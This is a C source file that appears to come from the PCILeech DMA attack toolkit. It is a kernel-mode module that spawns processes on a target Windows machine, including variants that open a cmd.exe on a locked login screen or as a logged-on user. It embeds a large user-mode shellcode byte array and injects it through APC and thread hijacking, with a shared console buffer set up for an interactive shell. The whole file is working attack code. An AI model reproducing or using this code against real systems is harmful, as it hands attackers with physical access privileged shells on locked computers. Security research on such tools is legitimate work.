// wx64_pscreate.c : create/spawn new user mode processes.
// Compatible with Windows x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with (wx64_pscreate):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscreate.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscreate.exe "PROCESS CREATOR - SPAWN NEW PROCESSES ON TARGET!               \n===============================================================\nREQUIRED OPTIONS:                                              \n  -s   : Executable path including command line options.       \n         Example: '-s c:\windows\system32\cmd.exe'.            \n  -0   : Parent process PID to start new process from.         \n         Example '-0 0x0fe0'.                                  \nOPTIONAL OPTIONS:                                              \n  -1   : CreateProcess creation flags (dwCreationFlags) as     \n         specified on MSDN. Hidden Window = 0x08000000         \n  -2   : Redirect input - use to spawn interactive shell.      \n         Example: 0x01                                         \n  -3   : Timeout in seconds. Default: 60.                      \n  -4   : Boost (Windows 7 only): higher success ratio, but     \n         parent process may crash. Example 1. Default 0.       \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT =====%s\nNTSTATUS        : 0x%08X                                       \nADDITIONAL INFO : 0x%04X                                       \n===============================================================\n"
//
// ALTERNATIVELY (wx64_pscmd):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_SYSTEM /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscmd.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscmd.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nonly work if the target system is locked and the login screen is\nvisible. If it takes time waiting - then please touch any key on\nthe target system.   If the utility fails multiple times, please\ntry wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
//
// ALTERNATIVELY (wx64_pscmd_user):
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel wx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel /D_PSCMD /D_PSCMD_USER /D_WIN7_COMPAT wx64_pscreate.c
// ml64 wx64_common_a.asm /Fewx64_pscmd_user.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main wx64_pscreate.obj wx64_common.obj
// shellcode64.exe -o wx64_pscmd_user.exe "PROCESS CREATOR - AUTOMATICALLY SPAWN CMD.EXE AS USER ON TARGET!        \n================================================================\nAutomatically spawn a CMD.EXE on the target system. This utility\nwill spawn a cmd.exe in the context of a random logged on user.\nThis will work even though the computer may be locked. If this\nutility fails multiple times, please try wx64_pscreate instead.                                      \n===== DETAILED INFORMATION AFTER PROCESS CREATION ATTEMPT ======%s\nNTSTATUS        : 0x%08X                                        \nADDITIONAL INFO : 0x%04X                                        \n================================================================\n"
#include "wx64_common.h"

#define MAGIC_WAIT_WORD					0x01234123412341234
#define NUM_PARALELL_APC_THREADS		3

typedef enum _LOCK_OPERATION {
	IoReadAccess,
	IoWriteAccess,
	IoModifyAccess
} LOCK_OPERATION;

typedef enum _MM_PAGE_PRIORITY {
	LowPagePriority,
	NormalPagePriority = 16,
	HighPagePriority = 32
} MM_PAGE_PRIORITY;

typedef enum _MEMORY_CACHING_TYPE_ORIG {
	MmFrameBufferCached = 2
} MEMORY_CACHING_TYPE_ORIG;

typedef enum _KAPC_ENVIRONMENT {
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef struct _KAPC_STATE {
	LIST_ENTRY ApcListHead[MaximumMode];
	struct _KPROCESS *Process;
	union {
		UCHAR InProgressFlags;
		struct {
			BOOLEAN KernelApcInProgress : 1;
			BOOLEAN SpecialApcInProgress : 1;
		};
	};
	BOOLEAN KernelApcPending;
	BOOLEAN UserApcPending;
} KAPC_STATE, *PKAPC_STATE, *PRKAPC_STATE;

typedef struct _KAPC {
	UCHAR Type;
	UCHAR SpareByte0;
	UCHAR Size;
	UCHAR SpareByte1;
	ULONG SpareLong0;
	struct _KTHREAD *Thread;
	LIST_ENTRY ApcListEntry;
	PVOID Reserved[3];
	PVOID NormalContext;
	PVOID SystemArgument1;
	PVOID SystemArgument2;
	CCHAR ApcStateIndex;
	KPROCESSOR_MODE ApcMode;
	BOOLEAN Inserted;
} KAPC, *PKAPC, *PRKAPC;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID *PCLIENT_ID;

typedef struct SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	LONG Priority;
	LONG BasePriority;
	LARGE_INTEGER ContextSwitches;
	ULONG ThreadState;
	ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[68];
	LONG BasePriority;
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
	SYSTEM_THREAD_INFORMATION ThreadInfos[];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef struct tdUserShellConfig {
	CHAR  szProcToStart[MAX_PATH];
	QWORD qwAddrConsoleBuffer;
	DWORD fCreateProcess;
} USERSHELL_CONFIG, *PUSERSHELL_CONFIG;

//----------------------------------------------------------------------------------------------------------

typedef struct tdKERNEL_FUNCTIONS2 {
	PVOID(*IoAllocateMdl)(
		_In_opt_    PVOID   VirtualAddress,
		_In_        ULONG   Length,
		_In_        BOOLEAN SecondaryBuffer,
		_In_        BOOLEAN ChargeQuota,
		_Inout_opt_ PVOID   Irp
		);
	VOID(*KeInitializeApc)(
		_In_ PKAPC  Apc,
		_In_ PETHREAD  Thread,
		_In_ KAPC_ENVIRONMENT  TargetEnvironment,
		_In_ PVOID  KernelRoutine,
		_In_opt_ PVOID RundownRoutine,
		_In_ PVOID  NormalRoutine,
		_In_ KPROCESSOR_MODE  Mode,
		_In_ PVOID  Context
		);
	BOOLEAN(*KeInsertQueueApc)(
		_In_ PKAPC  Apc,
		_In_ PVOID  SystemArgument1,
		_In_ PVOID  SystemArgument2,
		_In_ UCHAR  PriorityBoost
		);
	VOID(*KeStackAttachProcess)(
		_Inout_ PEPROCESS   Process,
		_Out_   PRKAPC_STATE ApcState
		);
	VOID(*KeUnstackDetachProcess)(
		_In_ PRKAPC_STATE ApcState
		);
	PVOID(*MmAllocateContiguousMemory)(
		_In_ SIZE_T NumberOfBytes,
		_In_ QWORD HighestAcceptableAddress
		);
	VOID(*MmFreeContiguousMemory)(
		_In_ PVOID BaseAddress
		);
	PVOID(*MmMapLockedPagesSpecifyCache)(
		_In_     PVOID               MemoryDescriptorList,
		_In_     KPROCESSOR_MODE     AccessMode,
		_In_     MEMORY_CACHING_TYPE CacheType,
		_In_opt_ PVOID               BaseAddress,
		_In_     ULONG               BugCheckOnFailure,
		_In_     MM_PAGE_PRIORITY    Priority
		);
	VOID(*MmProbeAndLockPages)(
		_Inout_ PVOID           MemoryDescriptorList,
		_In_    KPROCESSOR_MODE AccessMode,
		_In_    LOCK_OPERATION  Operation
		);
	VOID(*ObDereferenceObject)(
		_In_ PVOID Object
		);
	LPSTR(*PsGetProcessImageFileName)(
		_In_  PEPROCESS Process
		);
	NTSTATUS(*PsLookupProcessByProcessId)(
		_In_  HANDLE    ProcessId,
		_Out_ PEPROCESS *Process
		);
	NTSTATUS(*PsLookupThreadByThreadId)(
		_In_  HANDLE   ThreadId,
		_Out_ PETHREAD *Thread
		);
	NTSTATUS(*RtlCreateUserThread)(
		_In_ HANDLE ProcessHandle,
		_In_ QWORD pSecurityDescriptor,
		_In_ BOOLEAN fCreateSuspended,
		_In_ QWORD StackZeroBits,
		_In_ SIZE_T* StackReserved,
		_In_ SIZE_T* StackCommit,
		_In_ QWORD EntryPoint,
		_In_ QWORD _opaque0,
		_Out_ PHANDLE ThreadHandle,
		_Out_ PCLIENT_ID ClientID
		);
	size_t(*strnlen)(
		const char *str,
		size_t numberOfElements
		);
	NTSTATUS(*ZwAllocateVirtualMemory)(
		_In_    HANDLE    ProcessHandle,
		_Inout_ PVOID     *BaseAddress,
		_In_    ULONG_PTR ZeroBits,
		_Inout_ PSIZE_T   RegionSize,
		_In_    ULONG     AllocationType,
		_In_    ULONG     Protect
		);
	NTSTATUS(*ZwOpenProcess)(
		_Out_    PHANDLE            ProcessHandle,
		_In_     ACCESS_MASK        DesiredAccess,
		_In_     POBJECT_ATTRIBUTES ObjectAttributes,
		_In_opt_ PCLIENT_ID         ClientId
		);

} KERNEL_FUNCTIONS2, *PKERNEL_FUNCTIONS2;

VOID InitializeKernelFunctions2(_In_ QWORD qwNtosBase, _Out_ PKERNEL_FUNCTIONS2 fnk2)
{
	DWORD i = 0, NAMES[18];
	NAMES[i++] = H_IoAllocateMdl;
	NAMES[i++] = H_KeInitializeApc;
	NAMES[i++] = H_KeInsertQueueApc;
	NAMES[i++] = H_KeStackAttachProcess;
	NAMES[i++] = H_KeUnstackDetachProcess;
	NAMES[i++] = H_MmAllocateContiguousMemory;
	NAMES[i++] = H_MmFreeContiguousMemory;
	NAMES[i++] = H_MmMapLockedPagesSpecifyCache;
	NAMES[i++] = H_MmProbeAndLockPages;
	NAMES[i++] = H_ObDereferenceObject;
	NAMES[i++] = H_PsGetProcessImageFileName;
	NAMES[i++] = H_PsLookupProcessByProcessId;
	NAMES[i++] = H_PsLookupThreadByThreadId;
	NAMES[i++] = H_RtlCreateUserThread;
	NAMES[i++] = H_strnlen;
	NAMES[i++] = H_ZwAllocateVirtualMemory;
	NAMES[i++] = H_ZwOpenProcess;
	while(i) {
		i--;
		*((PQWORD)fnk2 + i) = (QWORD)PEGetProcAddressH(qwNtosBase, NAMES[i]);
	}
}

//----------------------------------------------------------------------------------------------------------
// USER MODE SHELLCODE ASSIGNMENT BELOW:
//----------------------------------------------------------------------------------------------------------
#ifndef _EXEC_USER_EXTERNAL
VOID GetUserExecShellcode(_In_ PKMDDATA pk, _Out_ PBYTE *ppb, _Out_ PDWORD pcb)
{
	UNREFERENCED_PARAMETER(pk);
	BYTE wx64_exec_user_bin[] = {
		0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8d, 0x0d, 0x49, 0x00, 0x00, 0x00, 0xf0,
		0x0f, 0xb0, 0x11, 0x75, 0x42, 0x48, 0x8d, 0x0d, 0xe8, 0xff, 0xff, 0xff,
		0x48, 0x81, 0xe1, 0x00, 0xf0, 0xff, 0xff, 0x65, 0x48, 0x8b, 0x14, 0x25,
		0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18,
		0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0x12, 0x48, 0x8b,
		0x52, 0x20, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83,
		0xec, 0x20, 0xe8, 0xe1, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3,
		0x00, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x48, 0x63, 0x41, 0x3c, 0x4c,
		0x8b, 0xc9, 0x8b, 0xf2, 0x44, 0x8b, 0x84, 0x08, 0x88, 0x00, 0x00, 0x00,
		0x4c, 0x03, 0xc1, 0x45, 0x8b, 0x50, 0x20, 0x45, 0x8b, 0x58, 0x24, 0x4c,
		0x03, 0xd1, 0x41, 0x8b, 0x58, 0x1c, 0x4c, 0x03, 0xd9, 0x41, 0x8b, 0x78,
		0x18, 0x48, 0x03, 0xd9, 0x33, 0xc9, 0x85, 0xff, 0x74, 0x2d, 0x41, 0x8b,
		0x12, 0x49, 0x03, 0xd1, 0x45, 0x33, 0xc0, 0xeb, 0x0d, 0x0f, 0xb6, 0xc0,
		0x48, 0xff, 0xc2, 0x41, 0xc1, 0xc8, 0x0d, 0x44, 0x03, 0xc0, 0x8a, 0x02,
		0x84, 0xc0, 0x75, 0xed, 0x44, 0x3b, 0xc6, 0x74, 0x1c, 0xff, 0xc1, 0x49,
		0x83, 0xc2, 0x04, 0x3b, 0xcf, 0x72, 0xd3, 0x33, 0xc0, 0x48, 0x8b, 0x5c,
		0x24, 0x08, 0x48, 0x8b, 0x74, 0x24, 0x10, 0x48, 0x8b, 0x7c, 0x24, 0x18,
		0xc3, 0x41, 0x0f, 0xb7, 0x0c, 0x4b, 0x8b, 0x04, 0x8b, 0x49, 0x03, 0xc1,
		0xeb, 0xe3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b,
		0x41, 0x78, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0x48, 0x89, 0x08, 0x39, 0x8b,
		0x88, 0x00, 0x00, 0x00, 0x74, 0x22, 0x89, 0x8b, 0x88, 0x00, 0x00, 0x00,
		0x48, 0x8b, 0x4b, 0x58, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b, 0x50, 0xff,
		0x53, 0x08, 0x48, 0x8b, 0x4b, 0x60, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x4b,
		0x68, 0xff, 0x53, 0x08, 0x48, 0x8b, 0x43, 0x70, 0x48, 0xb9, 0xac, 0xda,
		0x37, 0x13, 0x00, 0x22, 0xda, 0xfe, 0x48, 0x89, 0x08, 0x48, 0x8b, 0x43,
		0x78, 0x48, 0x89, 0x08, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc,
		0x40, 0x53, 0x48, 0x83, 0xec, 0x70, 0xba, 0x68, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0xd9, 0x8d, 0x4a, 0xd8, 0xff, 0x53, 0x30, 0xc7, 0x00, 0x68, 0x00,
		0x00, 0x00, 0xc7, 0x40, 0x3c, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x13,
		0x48, 0x83, 0xba, 0x08, 0x01, 0x00, 0x00, 0x00, 0x74, 0x18, 0x48, 0x8b,
		0x4b, 0x60, 0x48, 0x89, 0x48, 0x58, 0x48, 0x8b, 0x4b, 0x68, 0x48, 0x89,
		0x48, 0x50, 0x48, 0x8b, 0x4b, 0x60, 0x48, 0x89, 0x48, 0x60, 0x48, 0x8b,
		0x13, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x4c, 0x24, 0x48, 0x45,
		0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x83,
		0x64, 0x24, 0x38, 0x00, 0x33, 0xc9, 0x48, 0x83, 0x64, 0x24, 0x30, 0x00,
		0x8b, 0x82, 0x10, 0x01, 0x00, 0x00, 0x89, 0x44, 0x24, 0x28, 0xc7, 0x44,
		0x24, 0x20, 0x01, 0x00, 0x00, 0x00, 0xff, 0x53, 0x18, 0x85, 0xc0, 0x74,
		0x26, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x8b, 0x80, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0x0b, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x08, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xff, 0x53, 0x08, 0xb8, 0x01,
		0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x70, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc,
		0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
		0x89, 0x70, 0x18, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xe9, 0xc7,
		0x40, 0xc8, 0xfb, 0x97, 0xfd, 0x0f, 0xc7, 0x40, 0xcc, 0x80, 0x8f, 0x0c,
		0x17, 0x48, 0x8d, 0x7a, 0x48, 0xc7, 0x40, 0xd0, 0x72, 0xfe, 0xb3, 0x16,
		0x48, 0x8d, 0x70, 0xec, 0xc7, 0x40, 0xd4, 0x6b, 0xd0, 0x2b, 0xca, 0xbb,
		0x09, 0x00, 0x00, 0x00, 0xc7, 0x40, 0xd8, 0x74, 0xab, 0x30, 0xac, 0xc7,
		0x40, 0xdc, 0xfa, 0x97, 0x02, 0x4c, 0xc7, 0x40, 0xe0, 0x16, 0x65, 0xfa,
		0x10, 0xc7, 0x40, 0xe4, 0xb0, 0x49, 0x2d, 0xdb, 0xc7, 0x40, 0xe8, 0x1f,
		0x79, 0x0a, 0xe8, 0x48, 0x8d, 0x76, 0xfc, 0x48, 0x8b, 0xcd, 0x8b, 0x16,
		0x48, 0x8d, 0x7f, 0xf8, 0xe8, 0xeb, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x07,
		0x83, 0xc3, 0xff, 0x75, 0xe6, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b,
		0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x50,
		0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xc1, 0x48,
		0x8d, 0x54, 0x24, 0x30, 0x48, 0x8b, 0x89, 0x80, 0x00, 0x00, 0x00, 0xff,
		0x50, 0x28, 0x33, 0xc9, 0x85, 0xc0, 0x74, 0x0f, 0x81, 0x7c, 0x24, 0x30,
		0x03, 0x01, 0x00, 0x00, 0x75, 0x05, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x8b,
		0xc1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24,
		0x10, 0x56, 0x48, 0x83, 0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00,
		0x00, 0x48, 0x8b, 0xd9, 0x0f, 0x84, 0xab, 0x00, 0x00, 0x00, 0xbe, 0x00,
		0x08, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0xe8, 0xa5, 0xff, 0xff, 0xff, 0x85,
		0xc0, 0x0f, 0x84, 0x96, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x43, 0x70, 0x4c,
		0x8b, 0x4b, 0x78, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x8b, 0x48, 0x10,
		0x41, 0x8b, 0x51, 0x08, 0x81, 0xe1, 0xff, 0x07, 0x00, 0x00, 0x81, 0xe2,
		0xff, 0x07, 0x00, 0x00, 0x3b, 0xca, 0x8b, 0xc2, 0x48, 0x8b, 0x4b, 0x58,
		0x77, 0x08, 0x44, 0x8b, 0xc6, 0x44, 0x2b, 0xc2, 0xeb, 0x03, 0x45, 0x33,
		0xc0, 0x49, 0x8d, 0x51, 0x68, 0x48, 0x03, 0xd0, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0xff, 0x53, 0x38, 0x85, 0xc0, 0x74, 0x4d, 0x48, 0x8b, 0x4b, 0x78,
		0x8b, 0x44, 0x24, 0x40, 0x48, 0x01, 0x41, 0x08, 0xeb, 0x1d, 0x83, 0xbb,
		0x88, 0x00, 0x00, 0x00, 0x00, 0x74, 0x36, 0x48, 0x8b, 0xcb, 0xe8, 0x35,
		0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x1d, 0xb9, 0x0a, 0x00, 0x00, 0x00,
		0xff, 0x53, 0x40, 0x48, 0x8b, 0x4b, 0x78, 0x48, 0x8b, 0x43, 0x70, 0x48,
		0x8b, 0x49, 0x08, 0x48, 0x2b, 0x48, 0x10, 0x48, 0x3b, 0xce, 0x73, 0xce,
		0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x85, 0x5a, 0xff, 0xff,
		0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x5b, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x5c,
		0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83,
		0xec, 0x30, 0x83, 0xb9, 0x88, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9,
		0x74, 0x78, 0x48, 0x8b, 0xcb, 0xe8, 0xda, 0xfe, 0xff, 0xff, 0x85, 0xc0,
		0x74, 0x6c, 0x48, 0x8b, 0x53, 0x78, 0x48, 0x8b, 0x4b, 0x70, 0x48, 0x8b,
		0x42, 0x10, 0x48, 0x39, 0x41, 0x08, 0x75, 0x0a, 0xb9, 0x0a, 0x00, 0x00,
		0x00, 0xff, 0x53, 0x40, 0xeb, 0x47, 0x44, 0x8b, 0x41, 0x08, 0x48, 0x8d,
		0x51, 0x68, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8d, 0x4c, 0x24,
		0x40, 0x48, 0x8b, 0x4b, 0x50, 0x25, 0xff, 0x07, 0x00, 0x00, 0x41, 0x81,
		0xe0, 0xff, 0x07, 0x00, 0x00, 0x48, 0x03, 0xd0, 0x41, 0x3b, 0xc0, 0x72,
		0x06, 0x41, 0xb8, 0x00, 0x08, 0x00, 0x00, 0x44, 0x2b, 0xc0, 0xff, 0x53,
		0x48, 0x85, 0xc0, 0x74, 0x15, 0x48, 0x8b, 0x4b, 0x78, 0x8b, 0x44, 0x24,
		0x40, 0x48, 0x01, 0x41, 0x10, 0x83, 0xbb, 0x88, 0x00, 0x00, 0x00, 0x00,
		0x75, 0x88, 0x48, 0x8b, 0xcb, 0xe8, 0xbe, 0xfc, 0xff, 0xff, 0x48, 0x83,
		0xc4, 0x30, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
		0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xfa, 0x48, 0x8b,
		0xd9, 0x48, 0x8b, 0xcf, 0xba, 0xfa, 0x97, 0x02, 0x4c, 0xe8, 0x06, 0xfc,
		0xff, 0xff, 0xba, 0x90, 0x00, 0x00, 0x00, 0x8d, 0x4a, 0xb0, 0xff, 0xd0,
		0x48, 0x8d, 0x8b, 0xe8, 0x0e, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x89,
		0x08, 0x48, 0x8d, 0x50, 0x08, 0x48, 0x8b, 0xcf, 0xe8, 0x83, 0xfd, 0xff,
		0xff, 0x48, 0x8b, 0x0e, 0x48, 0x83, 0xb9, 0x08, 0x01, 0x00, 0x00, 0x00,
		0x74, 0x7b, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x4c, 0x8d, 0x44, 0x24,
		0x30, 0xc7, 0x44, 0x24, 0x30, 0x18, 0x00, 0x00, 0x00, 0x48, 0xba, 0x21,
		0x95, 0xef, 0xdf, 0x32, 0x12, 0x65, 0x12, 0xbf, 0x01, 0x00, 0x00, 0x00,
		0xbb, 0x00, 0x08, 0x00, 0x00, 0x89, 0x7c, 0x24, 0x40, 0x44, 0x8b, 0xcb,
		0x48, 0x8b, 0x06, 0x48, 0x8b, 0x88, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89,
		0x4e, 0x70, 0x48, 0x8b, 0x80, 0x08, 0x01, 0x00, 0x00, 0x48, 0x05, 0x00,
		0x10, 0x00, 0x00, 0x48, 0x89, 0x46, 0x78, 0x48, 0x89, 0x11, 0x48, 0x8d,
		0x4e, 0x68, 0x48, 0x8b, 0x46, 0x78, 0x48, 0x89, 0x10, 0x48, 0x8d, 0x56,
		0x50, 0xff, 0x56, 0x10, 0x48, 0x8d, 0x56, 0x60, 0x44, 0x8b, 0xcb, 0x48,
		0x8d, 0x4e, 0x58, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0xff, 0x56, 0x10, 0x89,
		0xbe, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xe8, 0x3f, 0xfc, 0xff,
		0xff, 0x85, 0xc0, 0x75, 0x0a, 0x48, 0x8b, 0xce, 0xe8, 0xd7, 0xfb, 0xff,
		0xff, 0xeb, 0x45, 0x48, 0x8b, 0x06, 0x48, 0x83, 0xb8, 0x08, 0x01, 0x00,
		0x00, 0x00, 0x74, 0x38, 0x48, 0x83, 0x64, 0x24, 0x28, 0x00, 0x4c, 0x8d,
		0x05, 0x6b, 0xfe, 0xff, 0xff, 0x83, 0x64, 0x24, 0x20, 0x00, 0x4c, 0x8b,
		0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20, 0x48, 0x83, 0x64, 0x24,
		0x28, 0x00, 0x4c, 0x8d, 0x05, 0x77, 0xfd, 0xff, 0xff, 0x83, 0x64, 0x24,
		0x20, 0x00, 0x4c, 0x8b, 0xce, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, 0x20,
		0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83,
		0xc4, 0x50, 0x5f, 0xc3
	};
	*ppb = wx64_exec_user_bin; // user data
	*pcb = sizeof(wx64_exec_user_bin);
}
#endif /* ! _EXEC_USER_EXTERNAL */

#ifdef _EXEC_USER_EXTERNAL
VOID GetUserExecShellcode(_In_ PKMDDATA pk, _Out_ PBYTE *ppb, _Out_ PDWORD pcb)
{
	*ppb = pk->ReservedKMD[2]; // user data
	*pcb = 0x1000 - (pk->ReservedKMD[2] & 0xfff);
}
#endif /* _EXEC_USER_EXTERNAL */

//----------------------------------------------------------------------------------------------------------
// USER MODE CODE SETUP BELOW:
//----------------------------------------------------------------------------------------------------------

NTSTATUS IntializeUserModeCode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, PBYTE pb, QWORD qwAddrConsoleBuffer)
{
	PBYTE pbCodeUser;
	DWORD cbCodeUser;
	GetUserExecShellcode(pk, &pbCodeUser, &cbCodeUser);

	pk->ReservedKMD[4] = 0x7777666677776666;
	pk->ReservedKMD[5] = pbCodeUser;
	pk->ReservedKMD[6] = cbCodeUser;
	pk->ReservedKMD[6] = *(PQWORD)pbCodeUser;

	PUSERSHELL_CONFIG pCfg = (PUSERSHELL_CONFIG)(pb + 0x1000 - sizeof(USERSHELL_CONFIG));
	SIZE_T cchProcToStart = fnk2->strnlen(pk->dataInStr, MAX_PATH);
	if(cchProcToStart == 0) {
		return E_INVALIDARG;
	}
	fnk->RtlZeroMemory(pb, 0x1000);
	fnk->RtlCopyMemory(pb, pbCodeUser, cbCodeUser);
	fnk->RtlCopyMemory(pCfg->szProcToStart, pk->dataInStr, MAX_PATH);
	pCfg->fCreateProcess = (DWORD)pk->dataIn[1];
	pCfg->qwAddrConsoleBuffer = qwAddrConsoleBuffer;
	return S_OK;
}

/*
* Initialized a 2-page console buffer inside the user mode process used for
* thread hi-jacking. The pages are allocated from the NoPagedPool. On success
* the memory and the MDL object allocated will be "leaked". On exit the physical
* memory location be written to dataOut[2], dataInConsoleBuffer and dataOutConsoleBuffer.
* NB! needs to be run insode a KeStackAttachProcess section.
*/
QWORD SetupConsoleBufferUserMode(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	PVOID pvMemory;
	PVOID pMdl;
	QWORD qwMemoryMapped;
	// Allocate and Zero memory.
	pvMemory = fnk->ExAllocatePool(0, 0x2000);
	if(!pvMemory) {
		return NULL;
	}
	fnk->RtlZeroMemory(pvMemory, 0x2000);
	// Allocate MDL.
	pMdl = fnk2->IoAllocateMdl(pvMemory, 0x2000, FALSE, FALSE, NULL);
	if(!pMdl) {
		fnk->ExFreePool(pvMemory);
		return NULL;
	}
	fnk2->MmProbeAndLockPages(pMdl, KernelMode, IoModifyAccess);
	// Map the memory into the target process.
	qwMemoryMapped = fnk2->MmMapLockedPagesSpecifyCache(pMdl, UserMode, MmCached, NULL, FALSE, NormalPagePriority);
	if(!qwMemoryMapped) {
		fnk->ExFreePool(pvMemory);
		return NULL;
	}
	// finish
	pk->dataInConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)qwMemoryMapped);
	pk->dataOutConsoleBuffer = fnk->MmGetPhysicalAddress((PVOID)(qwMemoryMapped + 0x1000));
	pk->dataOut[2] = pvMemory;
	pk->dataOut[3] = qwMemoryMapped;
	return qwMemoryMapped;
}

//----------------------------------------------------------------------------------------------------------
